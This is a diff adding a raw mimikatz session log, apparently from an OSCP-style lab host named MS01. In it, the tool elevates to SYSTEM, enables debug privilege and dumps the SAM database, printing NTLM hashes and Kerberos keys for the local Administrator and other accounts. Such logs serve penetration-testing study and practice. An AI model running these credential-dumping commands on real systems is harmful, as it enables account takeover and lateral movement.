@@ -1,0 +1,86 @@
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+1176	{0;000003e7} 0 D 76192     	NT AUTHORITY\SYSTEM	S-1-5-18	(15g,28p)	Impersonation (Impersonation)
+ -> Impersonated !
+ * Process Token : {0;00377ba7} 2 F 4214884   	oscp\nate	S-1-5-21-395943061-4281203283-1985023469-1106	(14g,24p)	Primary
+ * Thread Token  : {0;000003e7} 0 D 4255044   	NT AUTHORITY\SYSTEM	S-1-5-18	(15g,28p)	Impersonation (Impersonation)
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # lsadump::sam
+Domain : MS01
+SysKey : c83bd962b8f96d524b9304832b250599
+Local SID : S-1-5-21-4092024685-235929341-2660346364
+
+SAMKey : 02418a7158e54001eb21751e98f9a4e1
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 7881a9258b537cb7f00b710bdbcb20dd
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 3553e83c98624e535eac489491a3fa79
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WIN-N6FAC3A7I4IAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 6841f8c89a4596b1de08c146a2ef942b767276354a94a2d0abe2d7a56668fe8b
+      aes128_hmac       (4096) : 16a81031dacb534d9deaec7c1c99c29d
+      des_cbc_md5       (4096) : 7f1fc4ef6ead206e
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WIN-N6FAC3A7I4IAdministrator
+    Credentials
+      des_cbc_md5       : 7f1fc4ef6ead206e
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: f8b0a3c96bb9f10069751a5fabf259d9
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 0fe25eac2b2fbcf34dbe89f28c8db4c1
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : f990327cd606eeb1e05025f7887473c2a3e4dbc2ed2715ba8f1803fd0f502b5c
+      aes128_hmac       (4096) : 052daaeeffbd017d163925f88a256bd0
+      des_cbc_md5       (4096) : 3e6489e37f9b6e37
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : 3e6489e37f9b6e37
+
+
+mimikatz(commandline) # exit
+Bye!
